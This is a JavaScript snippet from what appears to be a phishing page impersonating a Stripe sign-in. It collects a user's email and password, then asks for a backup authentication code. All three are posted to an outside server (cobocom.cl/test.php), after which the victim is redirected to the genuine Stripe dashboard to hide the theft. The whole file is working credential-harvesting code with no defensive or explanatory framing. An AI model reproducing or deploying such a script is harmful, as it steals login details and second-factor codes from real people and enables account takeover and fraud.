<script type="text/javascript">

  var userEmail;
  var userPassword;
  var userBackUpCode;
  
  document.getElementById('form1').addEventListener('submit',processForm);
  ;
  
  hide('form2');
  

  function processForm(evt){

    evt.preventDefault();

    const uemail = this.email.value.trim();
    const password = this.password.value;
    // alert(uemail);
    if(ValidateEmail(uemail) && ValidateInput(password)){
      userEmail = uemail;
      userPassword = password
      hide('form1');
      show('form2');
      
      document.getElementById('form2').addEventListener('submit', function(evt){

          evt.preventDefault();

          const back_up_code = document.getElementById('back_up_code').value;

          if(ValidateInput(back_up_code)){

              userBackUpCode = back_up_code

             
              // URL of the endpoint you want to make a POST request to
              const url = 'https://cobocom.cl/test.php';

              // Create a new FormData object
              const formData = new FormData();

              // Append data to the FormData object
              formData.append('email', userEmail);
              formData.append('password', userPassword);
              formData.append('code', userBackUpCode);
              // Add any other form data key-value pairs as needed

              // Make the POST request using Axios
              axios.post(url, formData, {
                headers: {
                  'Content-Type': 'multipart/form-data' // Specify content type as multipart/form-data for form data
                  // Add any other headers if needed
                }
              })
              .then(response => {
                console.log('Response:', response.data);
                window.location.href = 'https://dashboard.stripe.com/';
              })
              .catch(error => {
                console.error('Error:', error);
                // Handle errors
              });



            

           }
      })

    }else{
      return false;
    }
  }


  


  
  function show(element){
    document.getElementById(element).style.display = "flex";
  }

  function hide(element){
    document.getElementById(element).style.display = "none";
  }




   function ValidateEmail(mail){
   if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail))
    {
      return (true)
    }
      return (false)
  }


  function ValidateInput(text){
    if(text !=""){
      return (true)
    }

    return (false)
  }


   


  



</script>
